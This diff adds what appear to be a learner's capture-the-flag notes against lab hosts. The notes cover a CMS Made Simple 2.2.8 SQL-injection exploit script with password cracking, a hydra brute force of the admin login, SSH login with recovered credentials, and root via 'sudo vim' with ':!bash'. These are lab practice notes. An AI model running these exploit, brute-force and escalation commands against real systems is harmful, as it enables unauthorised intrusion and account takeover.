@@ -1,0 +1,21 @@
+cups-info@cups.org
+
+mike
+
+/openemr-5_0_1_3 
+
+check /simple found the CMS Made Simple version 2.2.8
+searchsploit,  found that the version is vulnerable to SQL Injection
+
+python3 cmsmadesimple22-sql.py -u http://10.10.152.40/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+
+/usr/share/seclists/Passwords/Common-Credentials/best110.txt
+
+hydra -l mitch -P /usr/share/wordlist/rockyou.txt 10.10.213.182 http-post-form "/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect" -v
+[2222][ssh] host: 10.10.153.232   login: mitch   password: secret
+
+
+ssh mitch@10.10.152.40 -p 2222
+password: secret
+
+Just type sudo vim, and inside the text editor invoke the shell by typing :!bash
